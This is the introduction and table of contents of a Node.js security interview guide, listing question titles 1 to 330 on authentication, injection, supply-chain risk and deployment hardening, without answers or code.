# Node.js Security Interview Questions and Answers

_Last updated: October 28, 2026_

450 Node.js security interview questions with answers, split into three levels: 150 easy, 150 moderate and 150 advanced. The questions are about securing back-end code that runs on Node.js: authentication, authorization, input handling, injection, secrets, crypto, HTTP, dependencies and the npm supply chain, deployment and incident response.

The answers target current Node.js (24 LTS, 25 and 26) and Express 5, and they mention the version when a feature is new, like `crypto.argon2()` or the `--allow-net` permission flag. Code examples use ES modules.

## Table of Contents

- [Easy Questions (1-150)](#easy-questions-1-150)
- [Moderate Questions (151-300)](#moderate-questions-151-300)
- [Advanced Questions (301-450)](#advanced-questions-301-450)

### Easy Questions (1-150)

- [1: What does security mean for a Node.js back end?](#1-what-does-security-mean-for-a-nodejs-back-end)
- [2: What is the OWASP Top 10?](#2-what-is-the-owasp-top-10)
- [3: What is the CIA triad?](#3-what-is-the-cia-triad)
- [4: What is the difference between authentication and authorization?](#4-what-is-the-difference-between-authentication-and-authorization)
- [5: What is the difference between hashing and encryption?](#5-what-is-the-difference-between-hashing-and-encryption)
- [6: Why should you never store passwords in plain text?](#6-why-should-you-never-store-passwords-in-plain-text)
- [7: What is a salt?](#7-what-is-a-salt)
- [8: Why are MD5 and SHA-256 not good for hashing passwords?](#8-why-are-md5-and-sha-256-not-good-for-hashing-passwords)
- [9: How do you hash a password with bcrypt in Node.js?](#9-how-do-you-hash-a-password-with-bcrypt-in-nodejs)
- [10: What is Argon2 and why is it recommended?](#10-what-is-argon2-and-why-is-it-recommended)
- [11: What is the built-in crypto module used for?](#11-what-is-the-built-in-crypto-module-used-for)
- [12: Why shouldn't you use Math.random() for tokens?](#12-why-shouldnt-you-use-mathrandom-for-tokens)
- [13: What is HTTPS and why does a Node.js API need it?](#13-what-is-https-and-why-does-a-nodejs-api-need-it)
- [14: Do you usually terminate TLS in Node.js itself?](#14-do-you-usually-terminate-tls-in-nodejs-itself)
- [15: What is an environment variable and why are secrets stored there?](#15-what-is-an-environment-variable-and-why-are-secrets-stored-there)
- [16: Why should you never commit a .env file?](#16-why-should-you-never-commit-a-env-file)
- [17: How do you load a .env file in modern Node.js?](#17-how-do-you-load-a-env-file-in-modern-nodejs)
- [18: What is input validation?](#18-what-is-input-validation)
- [19: What is the difference between an allowlist and a denylist?](#19-what-is-the-difference-between-an-allowlist-and-a-denylist)
- [20: How do you validate request bodies in Node.js?](#20-how-do-you-validate-request-bodies-in-nodejs)
- [21: What is an injection attack?](#21-what-is-an-injection-attack)
- [22: What is SQL injection?](#22-what-is-sql-injection)
- [23: How do you prevent SQL injection in Node.js?](#23-how-do-you-prevent-sql-injection-in-nodejs)
- [24: What is NoSQL injection?](#24-what-is-nosql-injection)
- [25: What is command injection?](#25-what-is-command-injection)
- [26: How do you run external commands safely?](#26-how-do-you-run-external-commands-safely)
- [27: What is XSS and why does a back-end developer care about it?](#27-what-is-xss-and-why-does-a-back-end-developer-care-about-it)
- [28: How do you prevent XSS in server-rendered pages?](#28-how-do-you-prevent-xss-in-server-rendered-pages)
- [29: What is CSRF?](#29-what-is-csrf)
- [30: How do you protect against CSRF?](#30-how-do-you-protect-against-csrf)
- [31: What is CORS?](#31-what-is-cors)
- [32: How do you set up CORS in Express?](#32-how-do-you-set-up-cors-in-express)
- [33: Is CORS a security feature that protects your API?](#33-is-cors-a-security-feature-that-protects-your-api)
- [34: What is Helmet?](#34-what-is-helmet)
- [35: Why should you remove the X-Powered-By header?](#35-why-should-you-remove-the-x-powered-by-header)
- [36: What is the Strict-Transport-Security header?](#36-what-is-the-strict-transport-security-header)
- [37: What is the X-Content-Type-Options header?](#37-what-is-the-x-content-type-options-header)
- [38: What is clickjacking and how does the server prevent it?](#38-what-is-clickjacking-and-how-does-the-server-prevent-it)
- [39: What is a Content Security Policy?](#39-what-is-a-content-security-policy)
- [40: What is rate limiting?](#40-what-is-rate-limiting)
- [41: How do you add rate limiting to an Express app?](#41-how-do-you-add-rate-limiting-to-an-express-app)
- [42: What is a brute force attack?](#42-what-is-a-brute-force-attack)
- [43: What is a session?](#43-what-is-a-session)
- [44: Which cookie flags matter for security?](#44-which-cookie-flags-matter-for-security)
- [45: What is a JWT?](#45-what-is-a-jwt)
- [46: How do you create and verify a JWT in Node.js?](#46-how-do-you-create-and-verify-a-jwt-in-nodejs)
- [47: Where should a web app store a JWT?](#47-where-should-a-web-app-store-a-jwt)
- [48: What is the difference between an access token and a refresh token?](#48-what-is-the-difference-between-an-access-token-and-a-refresh-token)
- [49: What is multi-factor authentication?](#49-what-is-multi-factor-authentication)
- [50: What is a passkey?](#50-what-is-a-passkey)
- [51: What is OAuth 2.0?](#51-what-is-oauth-20)
- [52: What is OpenID Connect?](#52-what-is-openid-connect)
- [53: What is an API key and when do you use one?](#53-what-is-an-api-key-and-when-do-you-use-one)
- [54: What is the principle of least privilege?](#54-what-is-the-principle-of-least-privilege)
- [55: What is defense in depth?](#55-what-is-defense-in-depth)
- [56: Why shouldn't you run a Node.js app as root?](#56-why-shouldnt-you-run-a-nodejs-app-as-root)
- [57: What is a dependency vulnerability?](#57-what-is-a-dependency-vulnerability)
- [58: What does npm audit do?](#58-what-does-npm-audit-do)
- [59: Why should you commit package-lock.json?](#59-why-should-you-commit-package-lockjson)
- [60: What is the difference between npm install and npm ci?](#60-what-is-the-difference-between-npm-install-and-npm-ci)
- [61: What is a supply chain attack?](#61-what-is-a-supply-chain-attack)
- [62: What is typosquatting?](#62-what-is-typosquatting)
- [63: What are npm install scripts and why are they risky?](#63-what-are-npm-install-scripts-and-why-are-they-risky)
- [64: Why should you keep Node.js updated?](#64-why-should-you-keep-nodejs-updated)
- [65: What is an LTS version of Node.js?](#65-what-is-an-lts-version-of-nodejs)
- [66: What is NODE_ENV=production and does it affect security?](#66-what-is-node_envproduction-and-does-it-affect-security)
- [67: Why shouldn't you show stack traces to users?](#67-why-shouldnt-you-show-stack-traces-to-users)
- [68: What should you never write to logs?](#68-what-should-you-never-write-to-logs)
- [69: What is path traversal?](#69-what-is-path-traversal)
- [70: How do you prevent path traversal?](#70-how-do-you-prevent-path-traversal)
- [71: What are the main risks of file uploads?](#71-what-are-the-main-risks-of-file-uploads)
- [72: How do you limit upload size with multer?](#72-how-do-you-limit-upload-size-with-multer)
- [73: Why should you limit the request body size?](#73-why-should-you-limit-the-request-body-size)
- [74: What is a denial of service (DoS) attack?](#74-what-is-a-denial-of-service-dos-attack)
- [75: Why is blocking the event loop a security problem?](#75-why-is-blocking-the-event-loop-a-security-problem)
- [76: What is ReDoS?](#76-what-is-redos)
- [77: What is prototype pollution?](#77-what-is-prototype-pollution)
- [78: What is eval() and why is it dangerous?](#78-what-is-eval-and-why-is-it-dangerous)
- [79: What is security misconfiguration?](#79-what-is-security-misconfiguration)
- [80: What is an IDOR?](#80-what-is-an-idor)
- [81: Do random UUIDs fix IDOR?](#81-do-random-uuids-fix-idor)
- [82: What is role-based access control (RBAC)?](#82-what-is-role-based-access-control-rbac)
- [83: What is the difference between 401 and 403?](#83-what-is-the-difference-between-401-and-403)
- [84: What is user enumeration?](#84-what-is-user-enumeration)
- [85: How should a password reset flow work?](#85-how-should-a-password-reset-flow-work)
- [86: What makes a good password policy today?](#86-what-makes-a-good-password-policy-today)
- [87: What is session fixation?](#87-what-is-session-fixation)
- [88: How do you log a user out properly?](#88-how-do-you-log-a-user-out-properly)
- [89: What is express-session?](#89-what-is-express-session)
- [90: What is trust proxy in Express and why does it matter?](#90-what-is-trust-proxy-in-express-and-why-does-it-matter)
- [91: What is SSRF?](#91-what-is-ssrf)
- [92: What is an open redirect?](#92-what-is-an-open-redirect)
- [93: What is the difference between encoding, encryption and hashing?](#93-what-is-the-difference-between-encoding-encryption-and-hashing)
- [94: What is symmetric vs asymmetric encryption?](#94-what-is-symmetric-vs-asymmetric-encryption)
- [95: What is HMAC?](#95-what-is-hmac)
- [96: What is a timing attack?](#96-what-is-a-timing-attack)
- [97: How do you compare secrets safely in Node.js?](#97-how-do-you-compare-secrets-safely-in-nodejs)
- [98: What is a secret manager?](#98-what-is-a-secret-manager)
- [99: What is secret rotation?](#99-what-is-secret-rotation)
- [100: What is a CVE?](#100-what-is-a-cve)
- [101: How do you find out about Node.js security releases?](#101-how-do-you-find-out-about-nodejs-security-releases)
- [102: What is Dependabot?](#102-what-is-dependabot)
- [103: What is a lockfile integrity hash?](#103-what-is-a-lockfile-integrity-hash)
- [104: What are devDependencies and why does it matter for security?](#104-what-are-devdependencies-and-why-does-it-matter-for-security)
- [105: What is the difference between vulnerability, threat and risk?](#105-what-is-the-difference-between-vulnerability-threat-and-risk)
- [106: What is an attack surface?](#106-what-is-an-attack-surface)
- [107: What is the same-origin policy?](#107-what-is-the-same-origin-policy)
- [108: What is the SameSite cookie attribute?](#108-what-is-the-samesite-cookie-attribute)
- [109: What are signed cookies?](#109-what-are-signed-cookies)
- [110: Should you put sensitive data in a JWT payload?](#110-should-you-put-sensitive-data-in-a-jwt-payload)
- [111: What is the exp claim in a JWT?](#111-what-is-the-exp-claim-in-a-jwt)
- [112: What are the iss and aud claims for?](#112-what-are-the-iss-and-aud-claims-for)
- [113: What is the difference between HS256 and RS256?](#113-what-is-the-difference-between-hs256-and-rs256)
- [114: What is a JWKS?](#114-what-is-a-jwks)
- [115: What is TOTP?](#115-what-is-totp)
- [116: What is account lockout and what is the downside?](#116-what-is-account-lockout-and-what-is-the-downside)
- [117: What is a CAPTCHA and when do you use it?](#117-what-is-a-captcha-and-when-do-you-use-it)
- [118: What is input sanitization and how is it different from validation?](#118-what-is-input-sanitization-and-how-is-it-different-from-validation)
- [119: What is output encoding?](#119-what-is-output-encoding)
- [120: Why is it risky to use JSON.parse on untrusted input?](#120-why-is-it-risky-to-use-jsonparse-on-untrusted-input)
- [121: What is the difference between Buffer.alloc and Buffer.allocUnsafe?](#121-what-is-the-difference-between-bufferalloc-and-bufferallocunsafe)
- [122: Why shouldn't you swallow uncaught exceptions and keep running?](#122-why-shouldnt-you-swallow-uncaught-exceptions-and-keep-running)
- [123: What is security logging?](#123-what-is-security-logging)
- [124: What is structured logging and why use it?](#124-what-is-structured-logging-and-why-use-it)
- [125: What is a security header scanner?](#125-what-is-a-security-header-scanner)
- [126: What is the Referrer-Policy header?](#126-what-is-the-referrer-policy-header)
- [127: What is the Permissions-Policy header?](#127-what-is-the-permissions-policy-header)
- [128: What is the Cache-Control header's role in security?](#128-what-is-the-cache-control-headers-role-in-security)
- [129: What is HTTP Basic authentication and is it safe?](#129-what-is-http-basic-authentication-and-is-it-safe)
- [130: What is a bearer token?](#130-what-is-a-bearer-token)
- [131: Why should you not put tokens in URLs?](#131-why-should-you-not-put-tokens-in-urls)
- [132: What is the difference between encryption in transit and at rest?](#132-what-is-the-difference-between-encryption-in-transit-and-at-rest)
- [133: How do you encrypt data with AES in Node.js?](#133-how-do-you-encrypt-data-with-aes-in-nodejs)
- [134: What is a security vulnerability disclosure policy?](#134-what-is-a-security-vulnerability-disclosure-policy)
- [135: What is the security.txt file?](#135-what-is-the-securitytxt-file)
- [136: What is the risk of exposing the Node.js inspector?](#136-what-is-the-risk-of-exposing-the-nodejs-inspector)
- [137: What is the risk of using outdated or abandoned packages?](#137-what-is-the-risk-of-using-outdated-or-abandoned-packages)
- [138: How do you check if a package is trustworthy before installing it?](#138-how-do-you-check-if-a-package-is-trustworthy-before-installing-it)
- [139: What is a reverse proxy and how does it help security?](#139-what-is-a-reverse-proxy-and-how-does-it-help-security)
- [140: What is a WAF?](#140-what-is-a-waf)
- [141: What is two-factor bypass through a recovery flow?](#141-what-is-two-factor-bypass-through-a-recovery-flow)
- [142: What is a refresh token rotation?](#142-what-is-a-refresh-token-rotation)
- [143: What is the difference between stateful and stateless authentication?](#143-what-is-the-difference-between-stateful-and-stateless-authentication)
- [144: What does "never trust the client" mean in practice?](#144-what-does-never-trust-the-client-mean-in-practice)
- [145: What is mass assignment?](#145-what-is-mass-assignment)
- [146: What is the X-Forwarded-For header and can you trust it?](#146-what-is-the-x-forwarded-for-header-and-can-you-trust-it)
- [147: What is a security code review?](#147-what-is-a-security-code-review)
- [148: What is SAST and DAST?](#148-what-is-sast-and-dast)
- [149: What is secret scanning?](#149-what-is-secret-scanning)
- [150: What is the first thing to do when a secret leaks?](#150-what-is-the-first-thing-to-do-when-a-secret-leaks)

### Moderate Questions (151-300)

- [151: How would you set up a secure Express app from scratch?](#151-how-would-you-set-up-a-secure-express-app-from-scratch)
- [152: What changed in Express 5 that matters for security?](#152-what-changed-in-express-5-that-matters-for-security)
- [153: How do you write an authentication middleware for JWT access tokens?](#153-how-do-you-write-an-authentication-middleware-for-jwt-access-tokens)
- [154: How do you implement refresh tokens securely?](#154-how-do-you-implement-refresh-tokens-securely)
- [155: How do you revoke JWTs before they expire?](#155-how-do-you-revoke-jwts-before-they-expire)
- [156: When would you choose sessions over JWTs?](#156-when-would-you-choose-sessions-over-jwts)
- [157: How do you store sessions in Redis?](#157-how-do-you-store-sessions-in-redis)
- [158: What are the __Host- and __Secure- cookie prefixes?](#158-what-are-the-__host--and-__secure--cookie-prefixes)
- [159: How do you protect a single page app that uses cookie sessions against CSRF?](#159-how-do-you-protect-a-single-page-app-that-uses-cookie-sessions-against-csrf)
- [160: What is the double submit cookie pattern?](#160-what-is-the-double-submit-cookie-pattern)
- [161: How do you use Fetch Metadata headers to block cross-site requests?](#161-how-do-you-use-fetch-metadata-headers-to-block-cross-site-requests)
- [162: What are common CORS misconfigurations?](#162-what-are-common-cors-misconfigurations)
- [163: How do you configure CORS with a dynamic list of origins?](#163-how-do-you-configure-cors-with-a-dynamic-list-of-origins)
- [164: How do you set up a nonce-based CSP with Helmet?](#164-how-do-you-set-up-a-nonce-based-csp-with-helmet)
- [165: How do you roll out a CSP without breaking the site?](#165-how-do-you-roll-out-a-csp-without-breaking-the-site)
- [166: What headers does Helmet set by default, and which would you change?](#166-what-headers-does-helmet-set-by-default-and-which-would-you-change)
- [167: Why does Helmet set X-XSS-Protection to 0?](#167-why-does-helmet-set-x-xss-protection-to-0)
- [168: How do you implement a distributed rate limiter?](#168-how-do-you-implement-a-distributed-rate-limiter)
- [169: How do you choose the key for rate limiting?](#169-how-do-you-choose-the-key-for-rate-limiting)
- [170: How do you slow down brute force login attempts without locking users out?](#170-how-do-you-slow-down-brute-force-login-attempts-without-locking-users-out)
- [171: How do you check a password against breached password lists?](#171-how-do-you-check-a-password-against-breached-password-lists)
- [172: What Argon2 parameters would you use?](#172-what-argon2-parameters-would-you-use)
- [173: How do you use the built-in crypto.scrypt for passwords?](#173-how-do-you-use-the-built-in-cryptoscrypt-for-passwords)
- [174: How do you upgrade old password hashes without forcing a reset?](#174-how-do-you-upgrade-old-password-hashes-without-forcing-a-reset)
- [175: What is a pepper and should you use one?](#175-what-is-a-pepper-and-should-you-use-one)
- [176: How do you implement email verification?](#176-how-do-you-implement-email-verification)
- [177: How do you handle email change securely?](#177-how-do-you-handle-email-change-securely)
- [178: What is step-up authentication?](#178-what-is-step-up-authentication)
- [179: How do you implement TOTP 2FA in Node.js?](#179-how-do-you-implement-totp-2fa-in-nodejs)
- [180: How do you add passkey login to a Node.js app?](#180-how-do-you-add-passkey-login-to-a-nodejs-app)
- [181: How do you implement "Sign in with Google" securely?](#181-how-do-you-implement-sign-in-with-google-securely)
- [182: What is PKCE and why is it used?](#182-what-is-pkce-and-why-is-it-used)
- [183: Why is the OAuth state parameter important?](#183-why-is-the-oauth-state-parameter-important)
- [184: How do you secure webhooks you receive?](#184-how-do-you-secure-webhooks-you-receive)
- [185: Why do you need the raw body to verify webhook signatures?](#185-why-do-you-need-the-raw-body-to-verify-webhook-signatures)
- [186: How do you send webhooks securely to your customers?](#186-how-do-you-send-webhooks-securely-to-your-customers)
- [187: How do you prevent replay attacks on signed requests?](#187-how-do-you-prevent-replay-attacks-on-signed-requests)
- [188: How would you design an API key system?](#188-how-would-you-design-an-api-key-system)
- [189: How do you implement authorization checks so they aren't forgotten?](#189-how-do-you-implement-authorization-checks-so-they-arent-forgotten)
- [190: What is ABAC and when do you need it over RBAC?](#190-what-is-abac-and-when-do-you-need-it-over-rbac)
- [191: How do you avoid mass assignment in Mongoose or Prisma?](#191-how-do-you-avoid-mass-assignment-in-mongoose-or-prisma)
- [192: How do you prevent NoSQL injection in Mongoose?](#192-how-do-you-prevent-nosql-injection-in-mongoose)
- [193: Is Prisma safe from SQL injection?](#193-is-prisma-safe-from-sql-injection)
- [194: How do you safely build a dynamic ORDER BY or column name?](#194-how-do-you-safely-build-a-dynamic-order-by-or-column-name)
- [195: How do you prevent SSRF in a feature that fetches user-provided URLs?](#195-how-do-you-prevent-ssrf-in-a-feature-that-fetches-user-provided-urls)
- [196: What is DNS rebinding and how does it affect SSRF protection?](#196-what-is-dns-rebinding-and-how-does-it-affect-ssrf-protection)
- [197: How do you validate that an IP address is private in Node.js?](#197-how-do-you-validate-that-an-ip-address-is-private-in-nodejs)
- [198: How do you check the real type of an uploaded file?](#198-how-do-you-check-the-real-type-of-an-uploaded-file)
- [199: Why are SVG uploads dangerous?](#199-why-are-svg-uploads-dangerous)
- [200: Where should uploaded files be stored?](#200-where-should-uploaded-files-be-stored)
- [201: How do you serve user-uploaded files safely?](#201-how-do-you-serve-user-uploaded-files-safely)
- [202: What is a zip slip vulnerability?](#202-what-is-a-zip-slip-vulnerability)
- [203: How do you protect against zip bombs and decompression bombs?](#203-how-do-you-protect-against-zip-bombs-and-decompression-bombs)
- [204: How do you validate environment variables at startup?](#204-how-do-you-validate-environment-variables-at-startup)
- [205: What problems come with keeping secrets in environment variables?](#205-what-problems-come-with-keeping-secrets-in-environment-variables)
- [206: How do you stop child processes from inheriting all secrets?](#206-how-do-you-stop-child-processes-from-inheriting-all-secrets)
- [207: How do you load secrets from AWS Secrets Manager in Node.js?](#207-how-do-you-load-secrets-from-aws-secrets-manager-in-nodejs)
- [208: What is envelope encryption?](#208-what-is-envelope-encryption)
- [209: How do you encrypt specific database fields?](#209-how-do-you-encrypt-specific-database-fields)
- [210: How do you configure TLS options when running an HTTPS server in Node?](#210-how-do-you-configure-tls-options-when-running-an-https-server-in-node)
- [211: Why is NODE_TLS_REJECT_UNAUTHORIZED=0 dangerous?](#211-why-is-node_tls_reject_unauthorized0-dangerous)
- [212: What is mutual TLS (mTLS)?](#212-what-is-mutual-tls-mtls)
- [213: How do you make outgoing HTTP calls safely?](#213-how-do-you-make-outgoing-http-calls-safely)
- [214: What HTTP server timeouts should you know in Node.js?](#214-what-http-server-timeouts-should-you-know-in-nodejs)
- [215: What is a Slowloris attack?](#215-what-is-a-slowloris-attack)
- [216: What is the max header size in Node and why does it exist?](#216-what-is-the-max-header-size-in-node-and-why-does-it-exist)
- [217: How does Node protect against HTTP header injection?](#217-how-does-node-protect-against-http-header-injection)
- [218: What is HTTP parameter pollution?](#218-what-is-http-parameter-pollution)
- [219: How do you validate query string parameters?](#219-how-do-you-validate-query-string-parameters)
- [220: Why should pagination limits be enforced on the server?](#220-why-should-pagination-limits-be-enforced-on-the-server)
- [221: How do you write a safe error handler in Express?](#221-how-do-you-write-a-safe-error-handler-in-express)
- [222: How do you redact sensitive fields in Pino logs?](#222-how-do-you-redact-sensitive-fields-in-pino-logs)
- [223: What is log injection?](#223-what-is-log-injection)
- [224: What should an audit log contain?](#224-what-should-an-audit-log-contain)
- [225: How do you secure a GraphQL API in Node?](#225-how-do-you-secure-a-graphql-api-in-node)
- [226: What are GraphQL batching and alias attacks?](#226-what-are-graphql-batching-and-alias-attacks)
- [227: How do you authenticate WebSocket connections?](#227-how-do-you-authenticate-websocket-connections)
- [228: What limits should a WebSocket server have?](#228-what-limits-should-a-websocket-server-have)
- [229: How do you use child_process safely when you must use a shell?](#229-how-do-you-use-child_process-safely-when-you-must-use-a-shell)
- [230: What changed with spawning .bat and .cmd files on Windows?](#230-what-changed-with-spawning-bat-and-cmd-files-on-windows)
- [231: Why is option injection a risk even with execFile?](#231-why-is-option-injection-a-risk-even-with-execfile)
- [232: What is server-side template injection?](#232-what-is-server-side-template-injection)
- [233: Why can passing req.query into res.render be dangerous?](#233-why-can-passing-reqquery-into-resrender-be-dangerous)
- [234: How do you prevent prototype pollution in your own code?](#234-how-do-you-prevent-prototype-pollution-in-your-own-code)
- [235: Why does JSON.parse create a `__proto__` key that's dangerous later?](#235-why-does-jsonparse-create-a-__proto__-key-thats-dangerous-later)
- [236: How do you find vulnerable regular expressions in a codebase?](#236-how-do-you-find-vulnerable-regular-expressions-in-a-codebase)
- [237: How do you make regex-based validation safe from ReDoS?](#237-how-do-you-make-regex-based-validation-safe-from-redos)
- [238: How do you protect the event loop from expensive requests?](#238-how-do-you-protect-the-event-loop-from-expensive-requests)
- [239: How do you reject requests when the server is overloaded?](#239-how-do-you-reject-requests-when-the-server-is-overloaded)
- [240: What is the risk of the default thread pool size with password hashing?](#240-what-is-the-risk-of-the-default-thread-pool-size-with-password-hashing)
- [241: How do you secure a Node.js Docker image?](#241-how-do-you-secure-a-nodejs-docker-image)
- [242: How do you pass secrets to a Docker build without leaking them?](#242-how-do-you-pass-secrets-to-a-docker-build-without-leaking-them)
- [243: How do you run Node securely in Kubernetes?](#243-how-do-you-run-node-securely-in-kubernetes)
- [244: What is the risk of the cloud metadata endpoint?](#244-what-is-the-risk-of-the-cloud-metadata-endpoint)
- [245: How do you use GitHub Actions securely for a Node project?](#245-how-do-you-use-github-actions-securely-for-a-node-project)
- [246: What is script injection in GitHub Actions?](#246-what-is-script-injection-in-github-actions)
- [247: How do you publish npm packages securely today?](#247-how-do-you-publish-npm-packages-securely-today)
- [248: What is npm provenance?](#248-what-is-npm-provenance)
- [249: What is the overrides field in package.json for?](#249-what-is-the-overrides-field-in-packagejson-for)
- [250: How do you reduce risk from install scripts with pnpm or npm?](#250-how-do-you-reduce-risk-from-install-scripts-with-pnpm-or-npm)
- [251: How do you protect against newly published malicious package versions?](#251-how-do-you-protect-against-newly-published-malicious-package-versions)
- [252: What does a malicious npm package usually do?](#252-what-does-a-malicious-npm-package-usually-do)
- [253: How do you review a dependency update in a pull request?](#253-how-do-you-review-a-dependency-update-in-a-pull-request)
- [254: What is an SBOM and how do you create one for a Node app?](#254-what-is-an-sbom-and-how-do-you-create-one-for-a-node-app)
- [255: How do you scan a container image for vulnerabilities?](#255-how-do-you-scan-a-container-image-for-vulnerabilities)
- [256: How do you use Semgrep or CodeQL for a Node.js project?](#256-how-do-you-use-semgrep-or-codeql-for-a-nodejs-project)
- [257: What does eslint-plugin-security catch?](#257-what-does-eslint-plugin-security-catch)
- [258: How would you test an API for broken access control?](#258-how-would-you-test-an-api-for-broken-access-control)
- [259: What is OWASP ZAP and how do you use it on an API?](#259-what-is-owasp-zap-and-how-do-you-use-it-on-an-api)
- [260: How do you add security checks to a CI pipeline?](#260-how-do-you-add-security-checks-to-a-ci-pipeline)
- [261: How do you handle authentication in microservices?](#261-how-do-you-handle-authentication-in-microservices)
- [262: What is the OAuth client credentials flow?](#262-what-is-the-oauth-client-credentials-flow)
- [263: What is the backend for frontend (BFF) pattern for auth?](#263-what-is-the-backend-for-frontend-bff-pattern-for-auth)
- [264: How do you implement multi-tenant isolation?](#264-how-do-you-implement-multi-tenant-isolation)
- [265: How do you use PostgreSQL row-level security with Node?](#265-how-do-you-use-postgresql-row-level-security-with-node)
- [266: How do you limit what the database user can do?](#266-how-do-you-limit-what-the-database-user-can-do)
- [267: What is a race condition vulnerability?](#267-what-is-a-race-condition-vulnerability)
- [268: How do you fix race conditions in balance or coupon logic?](#268-how-do-you-fix-race-conditions-in-balance-or-coupon-logic)
- [269: What are idempotency keys and how do they help security?](#269-what-are-idempotency-keys-and-how-do-they-help-security)
- [270: How do you prevent account takeover through OAuth account linking?](#270-how-do-you-prevent-account-takeover-through-oauth-account-linking)
- [271: How do you secure an admin panel?](#271-how-do-you-secure-an-admin-panel)
- [272: How do you implement impersonation ("log in as user") safely?](#272-how-do-you-implement-impersonation-log-in-as-user-safely)
- [273: How do you handle file paths from user input when serving static files?](#273-how-do-you-handle-file-paths-from-user-input-when-serving-static-files)
- [274: Why is serving the project root as static files a mistake?](#274-why-is-serving-the-project-root-as-static-files-a-mistake)
- [275: Should you ship source maps to production?](#275-should-you-ship-source-maps-to-production)
- [276: How do you protect against cache poisoning?](#276-how-do-you-protect-against-cache-poisoning)
- [277: What is a Host header attack?](#277-what-is-a-host-header-attack)
- [278: How do you prevent clickjacking on sensitive actions in a server-rendered app?](#278-how-do-you-prevent-clickjacking-on-sensitive-actions-in-a-server-rendered-app)
- [279: How do you implement secure "remember me" login?](#279-how-do-you-implement-secure-remember-me-login)
- [280: How do you detect stolen sessions?](#280-how-do-you-detect-stolen-sessions)
- [281: How do you handle CORS preflight requests correctly?](#281-how-do-you-handle-cors-preflight-requests-correctly)
- [282: What is the Cross-Origin-Resource-Policy header?](#282-what-is-the-cross-origin-resource-policy-header)
- [283: How do you secure a Fastify app?](#283-how-do-you-secure-a-fastify-app)
- [284: How does NestJS help with security?](#284-how-does-nestjs-help-with-security)
- [285: How do you hash API keys and look them up efficiently?](#285-how-do-you-hash-api-keys-and-look-them-up-efficiently)
- [286: How do you prevent sensitive data from being returned in API responses?](#286-how-do-you-prevent-sensitive-data-from-being-returned-in-api-responses)
- [287: What is excessive data exposure?](#287-what-is-excessive-data-exposure)
- [288: How do you keep secrets out of error tracking tools?](#288-how-do-you-keep-secrets-out-of-error-tracking-tools)
- [289: How do you use the Node.js permission model in practice?](#289-how-do-you-use-the-nodejs-permission-model-in-practice)
- [290: How do you avoid a decompression or parse bomb in JSON and XML handling?](#290-how-do-you-avoid-a-decompression-or-parse-bomb-in-json-and-xml-handling)
- [291: What is XXE and does it affect Node.js?](#291-what-is-xxe-and-does-it-affect-nodejs)
- [292: Why is YAML parsing a risk?](#292-why-is-yaml-parsing-a-risk)
- [293: What is insecure deserialization in Node.js?](#293-what-is-insecure-deserialization-in-nodejs)
- [294: How do you protect against XSS in JSON APIs?](#294-how-do-you-protect-against-xss-in-json-apis)
- [295: How do you safely embed server data in an HTML page?](#295-how-do-you-safely-embed-server-data-in-an-html-page)
- [296: What is a JWT "none" algorithm attack?](#296-what-is-a-jwt-none-algorithm-attack)
- [297: What is algorithm confusion in JWT?](#297-what-is-algorithm-confusion-in-jwt)
- [298: How do you rotate a JWT signing key without logging everyone out?](#298-how-do-you-rotate-a-jwt-signing-key-without-logging-everyone-out)
- [299: How do you choose the lifetime of access tokens and sessions?](#299-how-do-you-choose-the-lifetime-of-access-tokens-and-sessions)
- [300: What would you check in a security review of a new endpoint?](#300-what-would-you-check-in-a-security-review-of-a-new-endpoint)

### Advanced Questions (301-450)

- [301: What are the limits of the Node.js permission model?](#301-what-are-the-limits-of-the-nodejs-permission-model)
- [302: Why is the vm module not a security boundary?](#302-why-is-the-vm-module-not-a-security-boundary)
- [303: How would you run untrusted user code in a Node.js platform?](#303-how-would-you-run-untrusted-user-code-in-a-nodejs-platform)
- [304: Is WASI a security sandbox in Node.js?](#304-is-wasi-a-security-sandbox-in-nodejs)
- [305: How does prototype pollution turn into remote code execution?](#305-how-does-prototype-pollution-turn-into-remote-code-execution)
- [306: What Node.js flags help against prototype pollution?](#306-what-nodejs-flags-help-against-prototype-pollution)
- [307: How would you freeze Object.prototype in an existing app, and what breaks?](#307-how-would-you-freeze-objectprototype-in-an-existing-app-and-what-breaks)
- [308: How do you detect prototype pollution at runtime?](#308-how-do-you-detect-prototype-pollution-at-runtime)
- [309: How do backtracking regex engines cause ReDoS?](#309-how-do-backtracking-regex-engines-cause-redos)
- [310: What is V8's experimental linear regex engine?](#310-what-is-v8s-experimental-linear-regex-engine)
- [311: How would you safely support user-provided regex search?](#311-how-would-you-safely-support-user-provided-regex-search)
- [312: Explain HTTP request smuggling and how it affects Node apps.](#312-explain-http-request-smuggling-and-how-it-affects-node-apps)
- [313: What does --insecure-http-parser do and when is it acceptable?](#313-what-does---insecure-http-parser-do-and-when-is-it-acceptable)
- [314: What was the HTTP/2 Rapid Reset attack?](#314-what-was-the-http2-rapid-reset-attack)
- [315: How do you think about HashDoS in Node.js?](#315-how-do-you-think-about-hashdos-in-nodejs)
- [316: How can Buffer misuse leak memory contents?](#316-how-can-buffer-misuse-leak-memory-contents)
- [317: How do you keep secret keys safer in Node.js memory?](#317-how-do-you-keep-secret-keys-safer-in-nodejs-memory)
- [318: Why are heap snapshots and core dumps sensitive?](#318-why-are-heap-snapshots-and-core-dumps-sensitive)
- [319: How does Web Crypto in Node differ from node:crypto, and when do you use each?](#319-how-does-web-crypto-in-node-differ-from-nodecrypto-and-when-do-you-use-each)
- [320: How do timing side channels appear beyond string comparison?](#320-how-do-timing-side-channels-appear-beyond-string-comparison)
- [321: How would you design a split token for password resets or API keys?](#321-how-would-you-design-a-split-token-for-password-resets-or-api-keys)
- [322: How would you handle password hashing at scale without hurting availability?](#322-how-would-you-handle-password-hashing-at-scale-without-hurting-availability)
- [323: What is the BREACH attack and does it matter for Node APIs?](#323-what-is-the-breach-attack-and-does-it-matter-for-node-apis)
- [324: How do you design SSRF protection that's hard to bypass?](#324-how-do-you-design-ssrf-protection-thats-hard-to-bypass)
- [325: Why is an egress proxy a good SSRF defense?](#325-why-is-an-egress-proxy-a-good-ssrf-defense)
- [326: How do you protect against SSRF in PDF or HTML rendering services?](#326-how-do-you-protect-against-ssrf-in-pdf-or-html-rendering-services)
- [327: Walk through the 2025 npm supply chain incidents and what they taught.](#327-walk-through-the-2025-npm-supply-chain-incidents-and-what-they-taught)
- [328: What is dependency confusion?](#328-what-is-dependency-confusion)
- [329: What is lockfile injection?](#329-what-is-lockfile-injection)
- [330: How do you limit the damage a malicious dependency can do at runtime?](#330-how-do-you-limit-the-damage-a-malicious-dependency-can-do-at-runtime)
